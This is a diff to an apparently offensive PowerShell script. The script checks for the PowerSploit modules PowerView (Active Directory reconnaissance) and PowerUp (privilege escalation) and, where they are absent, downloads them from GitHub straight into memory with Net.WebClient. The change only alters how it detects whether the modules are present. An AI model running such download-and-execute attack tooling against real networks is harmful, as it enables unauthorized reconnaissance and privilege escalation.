@@ -56,7 +56,7 @@ Write-Host "Importing powerview and powerup modules"
 ## Import powerview and powerup modules
 
 ## Check for PowerView module and download if missing
-if (-not (Get-Help Get-DomainUser)) {
+if (-not (Get-DomainUser)) {
     Write-Output "PowerView module not found, downloading into memory..."
     try {
       $pwContent = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1')
@@ -70,7 +70,7 @@ if (-not (Get-Help Get-DomainUser)) {
    }
 
 ## Check for PowerUp module and download if missing
-if (-not (Get-Help Invoke-AllChecks)) {
+if (-not (Invoke-AllChecks)) {
     Write-Output "PowerUp module not found, downloading into memory..."
     try {
       $pwContent = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Privesc/PowerUp.ps1')
